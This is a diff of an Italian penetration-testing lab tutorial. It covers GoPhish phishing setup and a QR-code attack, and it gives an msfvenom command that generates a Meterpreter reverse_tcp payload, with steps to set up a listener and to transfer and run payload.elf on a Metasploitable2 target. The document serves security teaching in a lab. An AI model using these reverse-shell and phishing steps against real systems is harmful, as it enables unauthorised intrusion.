@@ -31,7 +31,7 @@ Aprite un terminale e digitate i seguenti comandi per dare permessi di esecuzion
 
 Scaricate sulla macchina Kali Linux il file gophish-v0.12.1-linux-64bit.zip dal seguente url https://github.com/gophish/gophish/releases.
 
-Estraete il file zip in una cartella sotto la cartella Desktop.
+Estraete il file zip in una cartella sotto la cartella Desktop e rendetelo eseguibile con il comando:
 ```
 # chmod +x gophish
 ```
@@ -103,12 +103,11 @@ Aprite qrcode_attack.png con un QRCode scanner online e.g Web QR per vedere che 
 
 **msfvenom** è uno strumento del framework Metasploit utilizzato per generare payload malevoli. Per creare un payload malevolo per Linux, seguiamo i seguenti passaggi.
 
-Apri un terminale e digita il seguente comando:
+Aprite un terminale e digitate il seguente comando:
 
 ```
 # msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP KALI VM> LPORT=<Porta> -f elf -o payload.elf
 ```
-Spiegazione dei Parametri:
 
 * -p linux/x86/meterpreter/reverse_tcp: Specifica il tipo di payload. In questo caso, stiamo utilizzando una reverse shell Meterpreter per Linux.
 * LHOST=<IP KALI VM >: L'indirizzo IP della macchina che riceverà la connessione reverse shell. Nel nostro caso la macchina Kali Linux.
@@ -132,12 +131,12 @@ Una volta generato il payload, è necessario configurare un listener sulla  macc
 * set LPORT <Porta>: Configura la porta sulla quale la tua macchina ascolterà.
 * exploit: Avvia il listener.
 
-Trasferisci il file payload.elf sulla macchina Metasploitable2  e rendilo eseguibile con il comando:
+Trasferite il file payload.elf sulla macchina Metasploitable2  e rendetelo eseguibile con il comando:
 
 ```
 # chmod +x payload.elf
 ```
-Esegui il payload sulla macchina target:
+Eseguite il payload sulla macchina target:
 
 ```
 # ./payload.elf
